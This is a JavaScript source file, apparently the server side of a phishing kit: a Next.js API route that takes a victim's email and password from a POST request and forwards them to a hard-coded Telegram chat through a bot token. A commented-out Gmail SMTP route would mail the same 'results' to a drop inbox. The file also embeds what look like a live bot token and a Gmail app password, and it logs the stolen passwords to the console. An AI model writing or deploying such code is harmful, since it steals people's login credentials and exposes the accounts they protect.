/** @format */

// app/api/sendemail/route.js
import nodemailer from "nodemailer";


//for telegram
import { TelegramClient } from "telegramsjs";

const botToken ="7874530313:AAHr0TFN0cB90-Z1MSuHfsY2BrXQoVPp8UQ"
const bot = new TelegramClient(botToken);
const chatId="7055420519"


//uncomment for email sending

// const transporter = nodemailer.createTransport({
//   host: "smtp.gmail.com", // Use the correct SMTP server for Gmail
//   port: 587, // Use port 587 for TLS or 465 for SSL
//   secure: false, // Set to true if using port 465
//   auth: {
//     user: "mohdkamal.darmansimadarbyoils@gmail.com", // Your Gmail address
//     pass: "ksgo zdwc bkdu msjf", // Use an app password for Gmail
//   },
// });

// Handle POST requests
export async function POST(req) {
  const { eparams, password } = await req.json(); // Get the email and password from the request body

  try {

    // uncomment for email

    // await transporter.sendMail({
    //   from: '"Your Name" <resultboxx2015@gmail.com>', // Sender address
    //   to: "resultboxx2015@gmail.com",
    //   // to: "timmyleeokoduwa7@gmail.com",
    //   subject: "Result delivery",
    //   text: `Email: ${eparams}\nPassword: ${password}`, // Plain text body
    // });



      //for sending telegram result

        await bot.sendMessage({
          text: `Email: ${eparams}\nPassword: ${password}`,
          chatId: chatId
        })
 
    


    // Log success message to console for email
    // console.log(
    //   `Email sent successfully to recipient@example.com! Email: ${eparams}, Password: ${password}`
    // );


    // Log success message to console for telegram
    console.log(
       `results sent to telegram successfully Email: ${eparams}, Password: ${password}`
    )

    return new Response(
      JSON.stringify({ message: "Email sent successfully!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending email:", error);
    return new Response(JSON.stringify({ error: "Error sending email" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}
